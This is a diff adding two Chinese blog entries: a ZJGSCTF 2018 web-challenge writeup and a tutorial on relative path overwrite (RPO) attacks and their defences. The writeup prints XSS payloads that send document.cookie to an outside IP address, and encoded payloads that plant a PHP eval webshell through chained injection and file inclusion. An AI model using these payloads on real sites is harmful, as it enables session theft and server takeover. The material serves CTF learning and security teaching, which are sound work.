@@ -3,9 +3,270 @@
   
     
     <entry>
+      <title><![CDATA[ZJGSCTF-2018-web writup]]></title>
+      <url>/2018/05/06/ZJGSCTF-2018-writeup/</url>
+      <content type="html"><![CDATA[<p>— ZJGSCTF 2018 —<br>—     web部分   —<br><a id="more"></a></p>
+<h2 id="给你的小世界"><a href="#给你的小世界" class="headerlink" title="给你的小世界"></a>给你的小世界</h2><p>好好地弄了下页面，编了个故事，抄了点情书，个人感觉还是挺好滴。</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr47td0na2j30vp0eyaaw.jpg" alt="1.png"><br></div>
+
+<p>解题的话，很简单，因为只是签到教学题。<br>右键-&gt;base64-&gt;base32-&gt;base16-&gt;flag</p>
+<h2 id="工商交友平台"><a href="#工商交友平台" class="headerlink" title="工商交友平台"></a>工商交友平台</h2><p>其实就是强网杯的Three hit<br>把它页面拔下来，自己后端还原了一下<br>是一个很好的二次注入题目<br>去这里看详细writeup吧 <a href="https://lalajun.github.io/2018/03/26/WEB-网强杯 WEB writeup" target="_blank" rel="external">WEB-网强杯 WEB writeup</a></p>
+<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p><strong>第一关</strong>：MD5弱类型<br>md5(QNKCDZO)=md5(240610708) 0e123=0e456 这样不多说<br><strong>第二关</strong>：让你知道了下php数组a[4]是第五个字符(即a[0]是第一个字符)，直接4就可以成功<br><strong>第三关</strong>：ereg()、strpos()、strlen()<15、$_3>99999999999999999<br>ereg：搜索正则，只要不是单纯的ZJGSCTF都可以的<br>strpos：要找到ZJGSCTF<br>字符串长度小于15<br>值大于9999999999<br>payload:<br><code>100e100ZJGSCTF</code></15、$_3></p>
+<p><strong>第四关</strong>：file_get_contents 文件读取函数，可以从伪协议中读取<br>猜测服务端的<code>url_allow_fopen</code>与<code>url_allow_include</code>的值</p>
+<h3 id="猜测-include-On"><a href="#猜测-include-On" class="headerlink" title="猜测 include=On"></a>猜测 include=On</h3><p>此时可以使用的伪协议：<br><code>php://input</code>测试可以使用</p>
+<p>但是php://input会从post中读取，肯定读取不到自定义信息，肯定包括php://input自身，不符合题目要求</p>
+<p>还考虑过，修改内容长度(php://input只读取post内容中http头指定内容长度的内容)使<code>php://input</code>只读取放在前面的自定义内容，把变量=php://input放在后面。但是这样子这个变量(即php://input)不会被解析，失败。</p>
+<p>还考虑过 远程包含文件，但是由于过滤<code>.</code>没有再去尝试</p>
+<h3 id="猜测-fopen-On-include-On"><a href="#猜测-fopen-On-include-On" class="headerlink" title="猜测 fopen=On include=On"></a>猜测 fopen=On include=On</h3><p>另外一个伪协议，可以当做输入流被读取<br><code>data:text/plain,内容</code><br><code>data:text/plain;base64,经过base64的内容</code><br>内容写入即可</p>
+<h2 id="小姐姐小姐姐，你听我说噢"><a href="#小姐姐小姐姐，你听我说噢" class="headerlink" title="小姐姐小姐姐，你听我说噢"></a>小姐姐小姐姐，你听我说噢</h2><p>感谢白猪老哥赞助的题目</p>
+<h3 id="admin-view-php"><a href="#admin-view-php" class="headerlink" title="admin/view.php"></a>admin/view.php</h3><p>有全部的源码。<br>先来看<code>admin/view.php</code>，这里可以了解到我们进不去的admin用户在做什么</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorly5xb6j30b502edfs.jpg" alt="wp6.png"><br></div>
+
+<p>这个页面是会3秒刷新一次，形成不断查看用户提交信息的行为。<br>之后会从数据库中原原本本读出用户提交的东西，显示在<code>&lt;div&gt;</code>标签内<br>截取一个在服务端形成的页面帮助理解标签构造(自己在本地也可以通过源码自己架构网站来实现查看)</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorn8iil5j30gx04ejr9.jpg" alt="wp7.png"><br></div>
+
+<p>可见这个地方是可以闭合标签形成XSS的，在<code>contact.php</code>中向admin用户发送payload</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqornu65xxj30p30a5753.jpg" alt="wp8.png"><br></div>
+
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqoro4akhgj30qe03iq2r.jpg" alt="wp9.png"><br></div>
+
+<p>尝试得到XSS<br>payload:<code>&lt;/div&gt; &lt;script&gt;window.location.href=&#39;http://45.63.17.127:12345/cookie.asp?msg=&#39;+document.cookie&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorofz8caj30ig058jrp.jpg" alt="wp10.png"><br></div>
+
+<p>失败<br>因为这里服务端<strong>PHP.INI</strong>设置了<code>session.cookie_httponly=On</code><br>如果没有设置的情况<br>换一个payload如下(两个payload效果是一样的)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;/div&gt; &lt;script&gt;var img = document.createElement(&apos;img&apos;);</div><div class="line">img.width = 0;</div><div class="line">img.height = 0;</div><div class="line">img.src = &apos;http://45.63.17.127:12345/a.php?joke=&apos;+document.cookie;&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</div></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorov86w6j30if05mq3d.jpg" alt="wp11.png"><br></div>
+
+<p>至此我们可以发现提交意见框存在XSS漏洞，也就是我们可以在admin用户的网页内执行任意前端代码，包括让admin用户去访问我们制定的网站，除了无法获得用户的cookie。</p>
+<blockquote>
+<p>ps.获得cookie是xss其中最经典的用法，xss还有其他很多利用方法，比如构造虚假页面欺骗admin用户，但在这题目中都没有利用余地，admin用户，只是打开了网页自动一直在刷新查阅消息</p>
+</blockquote>
+<h3 id="SERVER-‘SCRIPT-NAME’-漏洞"><a href="#SERVER-‘SCRIPT-NAME’-漏洞" class="headerlink" title="$_SERVER[‘SCRIPT_NAME’]漏洞"></a>$_SERVER[‘SCRIPT_NAME’]漏洞</h3><p>继续搜寻其他漏洞<br>查看<code>index.php</code>源码，发现其他所有js/css都是用静态位置表示对应css,js位置</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorphwnzbj30ii03lmxh.jpg" alt="wp1.png"><br></div>
+
+<p>只有这个地方使用<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>来获取当前网站位置</p>
+<blockquote>
+<p><strong>$_SERVER[‘SCPIPT_NAME’]</strong>在小于等于PHP5的版本里，会成为一个漏洞函数，它的触发还与APACHE的版本以及windows/linux系统有关。详情请见PHP漏洞函数分析一文。</p>
+</blockquote>
+<p>进行测试</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorpo4b79j30ga09j3ym.jpg" alt="wp2.png"><br></div>
+
+<p>发现成功对返回的页面进行修改，尝试是否可以进一步利用。<br>payload:<code>&quot;&gt; &lt;/a&gt; 1 &lt;a  href=&quot;</code><br>形成以下构造<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href="//index.php " &lt;/a&gt; 1 &lt;a  href="" class="btn btn-lg btn-default"&gt;Current Page&lt;/a&gt;</div></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorq32nyrj30ko05iglp.jpg" alt="wp3.png"><br></div>
+
+<p>payload:<code>&quot;&gt; &lt;/a&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;a  href= /</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorqf44xyj30kz09x0td.jpg" alt="wp4.png"><br></div>
+
+<p>可以发现，形成<strong>反弹XSS</strong><br>由于我们之前已经从<code>contact.php</code>得到了XSS，转而找其他的思路——<strong>嵌入后端代码</strong></p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorqpj4ssj30wi03vdgk.jpg" alt="wp16.png"><br></div>
+
+<p>我们可以看见嵌入php代码是成功的，但是它只会返回到页面上，不会再后端执行。</p>
+<p>此处必须说明关于 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 的另一个要点：<strong>只接受URL编码的值</strong><br>在该函数提取的URL中如果有特殊符号没有被URL加密过，就会直接舍弃全部</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrb3y58j30uz0750tn.jpg" alt="wp12.png"><br></div>
+
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorreey1yj30rp06gaat.jpg" alt="wp13.png"><br></div>
+
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorrhdembj30vj07awfc.jpg" alt="wp14.png"><br></div>
+
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrkmyc0j30uv07tjs8.jpg" alt="wp15.png"><br></div>
+
+<p>还不接受burpsuite的+代替空格的URL编码</p>
+<blockquote>
+<p>ps.之前在hackbar中的数据实际上在发送前会被URL加密一次。<br>经过hackbar发送的请求，自动URL加密GET参数，不自动URL加密POST参数</p>
+</blockquote>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><code>/admin/index.php</code> 有一处显而易见的远程文件包含<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span> <span class="string">"http://localhost/"</span>.$_GET[<span class="string">'path'</span>];</div></pre></td></tr></table></figure></p>
+<p>此处<strong>include</strong>会执行一次访问 “<a href="http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果" target="_blank" rel="external">http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果</a> 中的PHP代码<br>而在访问本地地址的时候会再解析一次，也就是这句话会把path指定的页面解析两次。<br>无法理解的话，请参考<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="external">lfi与rfi</a></p>
+<p>但是由于之前有<code>check()</code>验证cookie。而我们不是admin用户，没法利用</p>
+<p>同时这个页面，admin访问的话没有阻碍，即存在CSRF。</p>
+<h3 id="组合所有漏洞"><a href="#组合所有漏洞" class="headerlink" title="组合所有漏洞"></a>组合所有漏洞</h3><p>我们知道可以通过联系admin用户的输入框控制admin界面的前端页面，此处可以嵌入<code>&lt;img src= /&gt;</code>让admin用户自动访问任意网站，形成csrf<br>我们知道可以通过<code>/admin/index.php</code>的本地文件包含，包含执行对方服务器本地存在的代码。<br>我们知道可以在<code>index.php</code>中嵌入任意php代码</p>
+<p>于是一套COMBO就连成了。<br>通过<strong>输入框</strong>控制admin用户去访问<strong>/admin/index.php</strong>。在其<code>参数path</code>中让<strong>include包含</strong>被我们注入php代码的漏洞页面<strong>index.php/xxxxx</strong></p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>由于我们需要看到php执行的结果，把结果写入test.php文件夹中。<br>构造php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">fwrite(fopen(<span class="string">'test.php'</span>,<span class="string">'w+'</span>),<span class="string">"&lt;?php var_dump(glob('*'));?&gt;"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>第二，由于上面我们发现<strong>$_SERVER[‘SCPIPT_NAME’]</strong>注入php代码，需要保证php代码URL编码一次<br>计算我们此处payload需要URL编码的次数，顺便理清楚执行过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">输入框内编码x次 加上 发送浏览器自动编码<span class="number">1</span>次 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">admin用户页面查看view页面 数据提取出数据库，原样显示到view.php页面形成图片</div><div class="line">加上 admin用户在view.php通过浏览器自动访问 服务器/admin/index.php?path=xx 页面 发送浏览器自动编码<span class="number">1</span>次</div><div class="line">减去 服务器接受请求自动解码<span class="number">1</span>次</div><div class="line">因为PATH参数 远程<span class="keyword">include</span> http:<span class="comment">//localhost/index.php/xxxxxx  #此处的xxx需要剩2次编码</span></div><div class="line">服务器 远程请求 服务器自己 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">$_SERVER[<span class="string">'SCPIPT_NAME'</span>] 需要保证URL编码<span class="number">1</span>次</div></pre></td></tr></table></figure>
+<p>所以得出 在输入框内 需要对php内容进行2次编码</p>
+<p><strong>构造payload</strong></p>
+<blockquote>
+<p>初始payload:查看当前目录下所有文件，包括文件夹下内容<br><code>&lt;img src=http://10.21.13.225/admin/index.php?path=index.php/&lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&quot;&lt;?php var_dump(glob(&#39;*&#39;));?&gt;&quot;);?&gt; /&gt;</code></p>
+</blockquote>
+<p><code>&lt;img /&gt;</code> 等内容在admin用户 前端界面显示，所以这里不用URL加密</p>
+<blockquote>
+<p>对于 path=index.php/ 之后  /&gt; 之前，需要进入到最终 进行两次编码<br><code>&lt;img src=http://10.21.13.225/admin/index.php?</code><br><code>path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.</code><br><code>php%2527%252C%2527w%252b%2527%2529%252C%2522%253C%253Fphp%2520var_dump%2528glob%2528%252</code><br><code>7%252a%2527%2529%2529%253B%253F%253E%2522%2529%253B%253F%253E3%2520/&gt;</code>（此处为了显示，有换行）</p>
+</blockquote>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorrtn1j5j30qx02xgln.jpg" alt="wp17.png"><br></div>
+
+<p>成功，但是没有发现，既然可以写入文件，就写入web-shell吧</p>
+<h3 id="关于webshell-payload的细节分析"><a href="#关于webshell-payload的细节分析" class="headerlink" title="关于webshell-payload的细节分析"></a>关于webshell-payload的细节分析</h3><ul>
+<li>web-shell1：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;);</code></li>
+</ul>
+<p>但是<code>&quot;&lt;?php $_POST ?&gt;&quot;</code>双引号会对里面的 $_POST 进行解析,就没法原原本本写入</p>
+<ul>
+<li>web-shell2：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[\&#39;cmd\&#39;]);?&gt;&#39;);</code></li>
+</ul>
+<p>用单引号，内部对单引号要用\注释，如<code>\&#39;</code><br>但是在访问admin/index.phpURL解码一次，访问index.php时，URL编码的<code>\ -&gt; %5C</code>会被解析成目录路径，从而失败</p>
+<ul>
+<li>web-shell3：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;);</code></li>
+</ul>
+<p>考虑不使用<code>$_POST[\&#39;cmd\&#39;]</code>使用<code>$_POST[cmd]</code>，这种写法虽然会NOICE提醒错误，但是也可以使用<br>测试可行，还有更好的</p>
+<ul>
+<li>webshell_final：<code>fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);</code></li>
+</ul>
+<p>fwrite函数写入内容，外单引号，内双引号</p>
+<blockquote>
+<p>payload:<br><code>&lt;img src=http://10.21.13.225/admin/index.php?path=index.php/12&lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;3 /&gt;</code><br>finally:<br><code>&lt;img src=http://10.21.13.225/admin/index.php?</code><br><code>path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.</code><br><code>php%2527%252C%2527w%252b%2527%2529%252C%2527%253C%253Fphp%2520eval%2528%2524_POST</code><br><code>%255B%2522cmd%2522%255D%2529%253B%253F%253E%2527%2529%253B%253F%253E3%2520/&gt;</code>（此处为了显示，有换行）</p>
+</blockquote>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqortix4e5j30pn091t98.jpg" alt="wp18.png"><br></div>
+
+<p>接入菜刀/蚁剑，密码为shell中post参数</p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqosh707b2j30cl09pmxc.jpg" alt="wp19.png"><br></div>
+
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqoslgjlsaj30al02swef.jpg" alt="wp20.png"><br></div>
+
+<h3 id="view-php的XSS攻击-为何与-include无法结合"><a href="#view-php的XSS攻击-为何与-include无法结合" class="headerlink" title="view.php的XSS攻击 为何与 include无法结合"></a>view.php的XSS攻击 为何与 include无法结合</h3><p>也可能会有人思考到，view页面有XSS，向view页面写入php代码，在让admin用户去包含view页面这样。<br>如下payload</p>
+<blockquote>
+<p><code>&lt;/div&gt; &lt;?php fwrite(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;123&#39;);?&gt; &lt;div class=&quot;panel-body&quot;&gt; &lt;img src=http://10.21.13.225/admin/index.php?path=admin/index.php?path=view/&gt;</code></p>
+</blockquote>
+<p>事实是 不可以的。<br>admin用户去访问<code>/admin/index.php</code>会让服务器去访问<code>/admin/index.php?path=view</code><br>但是服务器在访问<code>/admin/index.php</code>的时候不能通过<code>check验证</code><br>所以就没法包含进view页面的php代码。</p>
+<p>那如果admin用户是在服务端的浏览器查看的，可不可以呢，也是不可以的。<br>include 远程文件 是不能包含cookie的</p>
+<h3 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h3><p>太特喵的累了….把能想到的问题一一尝试，全部解决了….也算是把白猪老哥的题弄清楚了….花了好长好长时间呜呜,溜了溜了qaq</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[WEB-RPO攻击]]></title>
+      <url>/2018/04/27/WEB-RPO%E6%94%BB%E5%87%BB/</url>
+      <content type="html"><![CDATA[<p>— RPO-相对路径覆盖攻击 —<br><a id="more"></a></p>
+<h1 id="RPO攻击"><a href="#RPO攻击" class="headerlink" title="RPO攻击"></a>RPO攻击</h1><p><strong>RPO</strong>(Relative Path Overwrite) —— <strong>相对路径覆盖</strong>，是一种新型攻击技术，主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。</p>
+<h2 id="RPO利用条件以及利用结果"><a href="#RPO利用条件以及利用结果" class="headerlink" title="RPO利用条件以及利用结果"></a>RPO利用条件以及利用结果</h2><p><strong>RPO攻击</strong>依赖于</p>
+<ul>
+<li>浏览器与服务器对于url地址解析反应的不同。这种反应的不同可以由 两者解析差异，WEB缓存技术和配置差异 造成</li>
+<li>前端代码使用相对于本页目录的相对路径来加载css/js <code>../css/style.css</code> 或 <code>./style.js</code></li>
+</ul>
+<p><strong>利用结果</strong>:<br>浏览器把服务器返回的其他文件当做css/js来解析。通常单单RPO是没有什么作用的，因为服务器不会有什么恶意的css/js存在。<br>但是配合上一些可以控制的文件(比如可以控制php页面返回自定义css代码,或js代码)。控制服务端使其返回恶意文件+RPO形成解析，导致了<strong>XSS，信息泄露</strong>等漏洞产生。</p>
+<h2 id="浏览器与服务端的差异"><a href="#浏览器与服务端的差异" class="headerlink" title="浏览器与服务端的差异"></a>浏览器与服务端的差异</h2><p>先了解关于服务端和客户端浏览器在解析和识别上的差异性，以Apache服务器和Nginx服务器为例。<br>ps.测试代码取自<a href="https://www.cnblogs.com/p00mj/p/6755000.html" target="_blank" rel="external">p00mj博客</a></p>
+<h3 id="服务器对于URL的解析"><a href="#服务器对于URL的解析" class="headerlink" title="服务器对于URL的解析"></a>服务器对于URL的解析</h3><h4 id="对于-2f的解析"><a href="#对于-2f的解析" class="headerlink" title="对于%2f的解析"></a>对于%2f的解析</h4><p>对于Apache服务器：<br>访问<code>http://localhost/RPO/index.php</code>,成功</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjrv22bhj30wt07dt9y.jpg" alt="1.png"><br></div>
+
+<p>对于<code>/</code>URL编码<code>%2f</code><br>访问<code>http://localhost/RPO%2findex.php</code>,失败</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjry8j1tj30x7070wfj.jpg" alt="2.png"><br></div>
+
+<p>对于Nginx服务器：<br>访问<code>http://localhost/RPO/index.php</code>,成功</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjs2egirj30r9063q3t.jpg" alt="10.png"><br></div>
+
+<p>访问<code>http://localhost/RPO%2findex.php</code>,成功</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjs70d09j30s005t3zd.jpg" alt="11.png"><br></div>
+
+<p>所以</p>
+<ul>
+<li><strong>Nginx web服务器是会对带有%2f的URL解析的</strong></li>
+<li><strong>Apache服务器时不能对带有%2f的URL进行解析的</strong></li>
+</ul>
+<h4 id="对于后续无意义目录的解析"><a href="#对于后续无意义目录的解析" class="headerlink" title="对于后续无意义目录的解析"></a>对于后续无意义目录的解析</h4><p>两种web服务器结果一致：<br>访问<code>http://localhost/1.php</code>,成功</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjsal32zj30v603r3yx.jpg" alt="3.png"><br></div>
+
+<p>访问<code>http://localhost/1.php/abc/ced.js/style.css</code>,成功，并且返回时跟1.php一样的界面</p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqrjuks3a2j30uo03yaan.jpg" alt="5.png"><br></div>
+
+<p>由此可知：<br><strong>服务器在找到有内容的页面后，不会解析后续没有意义的目录</strong></p>
+<h3 id="客户端浏览器对于URL的解析"><a href="#客户端浏览器对于URL的解析" class="headerlink" title="客户端浏览器对于URL的解析"></a>客户端浏览器对于URL的解析</h3><p>由于需要通过服务器的返回才能判断浏览器对于URL编码的解析，此处使用Nginx服务器。<br>访问<code>http://localhost/RPO/aa%2fbb/index.php</code>，css获取<code>../style.css</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjuqvaauj30ct015web.jpg" alt="16.png"><br></div>
+
+<p>浏览器请求的页面：<code>http://localhost/RPO/aa%2fbb/index.php</code><br>浏览器”应该”请求的CSS：<code>http://localhost/RPO/aa/index.php</code><br>浏览器实际请求的css：<code>http://localhost/RPO/style.css</code></p>
+<p>由此可知:<br><strong>浏览器是不会识别%2f作为路径分割的</strong></p>
+<h2 id="利用场景-pathinfho"><a href="#利用场景-pathinfho" class="headerlink" title="利用场景-pathinfho"></a>利用场景-pathinfho</h2><ul>
+<li>服务端：能不能对带有%2f的URL解析的WEB服务器都行(此例子是apache服务器)</li>
+<li>客户端：所以对于客户端也没有要求.</li>
+<li>css获取：通过相对路径获取(此例子中<code>href=&quot;./style.css&quot;</code>)</li>
+</ul>
+<blockquote>
+<p>之所以对于两种不同的服务器没有限定，因为实际上这种利用场景我们都是通过/去访问服务器</p>
+</blockquote>
+<p>先来了解浏览器根据相对路径请求css原则<br>访问<code>http://localhost/RPO/index.php/country/wei</code></p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjuyr90cj30dl018web.jpg" alt="6.png"><br></div>
+
+<p>访问<code>http://localhost/RPO/index.php/country/wei/</code></p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv1nziaj30f7016q2s.jpg" alt="7.png"><br></div>
+
+<p>可以知道浏览器是根据最后一个<strong>/</strong>作为当前目录，在通过相对路径知道css地址，再向服务端去请求该地址的CSS<br>所以访问<code>http://localhost/RPO/index.php/country/wei/style.css</code>作为css<br>而通过之前对于后续无意义目录的例子，可以知道css的内容应该跟index.php的内容一致</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjv84jwwj30qw04vaah.jpg" alt="8.png"><br></div>
+
+<p>所以，此处就形成了<code>把php文件当做是静态文件解析</code><br>单单这种形式的漏洞，利用空间较少，你必须要能向index.php中嵌入css(如果是加载作为js的话，就是嵌入js代码)才行,除了对于IE9,IE10的也可以利用同域文件<a href="">前端小姿势</a></p>
+<h3 id="pathinfo例子"><a href="#pathinfo例子" class="headerlink" title="pathinfo例子"></a>pathinfo例子</h3><p>此例子参考<a href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="external">rpo二三事</a></p>
+<p>由于我们需要能在index.php中写入css，构筑index.php代码,进入同目录下css(其内容不重要)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></div><div class="line">&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']);</div><div class="line">echo "&lt;br&gt;&lt;";</div><div class="line">?&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>正常访问情况</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvihfg0j30ei06tjrj.jpg" alt="12.png"><br></div>
+
+<p>访问<code>http://localhost/index.php/payload/</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvlfpmhj30du0173yc.jpg" alt="13.png"><br></div>
+
+<p>观察css内容，意料之中执行index.php页面代码</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqrjvorv45j30jm03aaa2.jpg" alt="14.png"><br></div>
+
+<p>开始注入payload<code>{}*{background-color:red}</code></p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fqrjvtowa5j30lj06z3yw.jpg" alt="15.png"><br></div>
+
+<p>其他css-payload 可以参考<a href="">前端小姿势</a></p>
+<h2 id="利用场景-基于-2f"><a href="#利用场景-基于-2f" class="headerlink" title="利用场景- 基于%2f"></a>利用场景- 基于%2f</h2><ul>
+<li>服务器:要求可以解析URL编码的WEB服务器(此处以Nginx为例)</li>
+<li>浏览器:不解析URL编码</li>
+<li>css获取：通过相对路径获取</li>
+</ul>
+<p><strong>场景假设</strong>:index.php利用相对路径<code>../css/style.css</code>引用style.css。我们可以修改profile.php向其中注入css代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">目录结构</div><div class="line">--php -- index.php</div><div class="line">  |   |</div><div class="line">  |   -- profile.php</div><div class="line">  |</div><div class="line">  css -- style.css</div></pre></td></tr></table></figure></p>
+<p>访问：<code>http://localhost/RPO/aa/php/profile.php/aa%2f..%2f../index.php</code><br>服务器视角：<code>http://localhost/RPO/aa/php/profile.php/aa/../../index.php</code>即<code>http://localhost/RPO/aa/php/index.php</code><br>浏览器视角:<code>http://localhost/RPO/aa/php/profile.php/aa%2f..%2f../index.php</code><br>CSS视角:<code>http://localhost/RPO/aa/php/profile.php/css/style.css</code><br>加上<strong>服务器对于后续无意义目录的解析</strong><br>最终实际从服务端加载的CSS：<code>http://localhost/RPO/aa/php/profile.php</code></p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqrjvyrd1tj30mj0dnq39.jpg" alt="17.png"><br></div>
+
+<p>所以，此处就形成了<strong>把不同目录下的php文件当做是静态文件解析</strong><br>利用的性质是:客户端与服务器对于%2f解析的不同，以及服务器对于多余目录的无视</p>
+<h3 id="基于-2f的跨目录解析例子"><a href="#基于-2f的跨目录解析例子" class="headerlink" title="基于%2f的跨目录解析例子"></a>基于%2f的跨目录解析例子</h3><p>直接上CTF题目吧</p>
+<p><a href="https://www.secpulse.com/archives/70070.html" target="_blank" rel="external">share your mind</a><br><a href="http://www.qingpingshan.com/m/view.php?aid=240597" target="_blank" rel="external">大物必须过</a></p>
+<h2 id="防护RPO"><a href="#防护RPO" class="headerlink" title="防护RPO"></a>防护RPO</h2><ul>
+<li>不使用相对路径，加载css/js : 最有效了</li>
+<li>在php页面最开头，声明<code>&lt;!DOCTYPE html&gt;</code>，使用规范模式解析<br>细节请参考<a href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="external">rpo二三事</a></li>
+</ul>
+<h1 id="关于WEB缓存的攻击"><a href="#关于WEB缓存的攻击" class="headerlink" title="关于WEB缓存的攻击"></a>关于WEB缓存的攻击</h1><p>不细说了，原理类似，应用环境不同 <a href="http://www.4hou.com/technology/3536.html" target="_blank" rel="external">戳这里</a></p>
